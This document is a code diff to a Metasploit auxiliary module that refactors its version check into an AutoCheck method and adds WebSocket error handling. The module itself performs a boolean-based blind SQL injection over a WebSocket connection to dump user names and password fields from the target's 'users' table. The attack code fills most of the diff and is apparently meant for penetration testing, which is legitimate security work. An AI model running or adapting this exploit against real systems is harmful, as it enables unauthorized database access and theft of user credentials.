@@ -5,9 +5,9 @@
 
 class MetasploitModule < Msf::Auxiliary
 
+  prepend Msf::Exploit::Remote::AutoCheck
   include Msf::Exploit::Remote::HttpClient
   include Rex::Proto::Http::WebSocket
-  include Msf::Auxiliary::Scanner
   include Msf::Auxiliary::Report
   include Msf::Exploit::SQLi
 
@@ -82,9 +82,9 @@ class MetasploitModule < Msf::Auxiliary
     status
   end
 
-  # Extract the version from the cgi endpoint and return true if the
-  # reported version is affected by the vulnerability.
-  def vulnerable_version?
+  # Extract the version from the cgi endpoint and compare against the
+  # known patched version (1.0.20.22)
+  def check
     normalized_uri = normalize_uri(target_uri.path, '/cgi')
     print_status("Requesting version information from #{normalized_uri}")
     res = send_request_cgi({
@@ -93,26 +93,22 @@ class MetasploitModule < Msf::Auxiliary
       'vars_post' => { 'action' => 'getInfo' }
     })
 
-    return false unless res&.code == 200
+    return Exploit::CheckCode::Unknown unless res && (res.code == 200)
 
     body_json = res.get_json_document
-    return false if body_json.empty?
+    return Exploit::CheckCode::Unknown if body_json.empty?
 
     prog_version = body_json.dig('response', 'prog_version')
-    return false if prog_version.nil?
+    return Exploit::CheckCode::Unknown if prog_version.nil?
 
-    print_status("The reported version is: #{prog_version}")
-
-    version = Rex::Version.new(prog_version)
-    version < Rex::Version.new('1.0.20.22')
-  end
-
-  def run_host(_ip)
-    # do a version check so the attacker doesn't waste their time
-    if !vulnerable_version?
-      print_error('The reported version is not vulnerable.')
+    if Rex::Version.new(prog_version) < Rex::Version.new('1.0.20.22')
+      return Exploit::CheckCode::Appears("The self-reported version is: #{prog_version}")
     end
 
+    Exploit::CheckCode::Safe("The self-reported version is: #{prog_version}")
+  end
+
+  def run
     sqli = create_sqli(dbms: SQLitei::BooleanBasedBlind) do |payload|
       wsock = connect_ws(
         'method' => 'GET',
@@ -121,6 +117,11 @@ class MetasploitModule < Msf::Auxiliary
 
       wsock.put_wstext(create_injection_request(payload))
       recv_wsframe_status(wsock) == 0
+
+    rescue Rex::Proto::Http::WebSocket::ConnectionError => e
+      res = e.http_response
+      fail_with(Failure::Unreachable, e.message) if res.nil?
+      fail_with(Failure::Unknown, e.message)
     end
 
     users = sqli.dump_table_fields('users', ['user_name', 'user_password'])
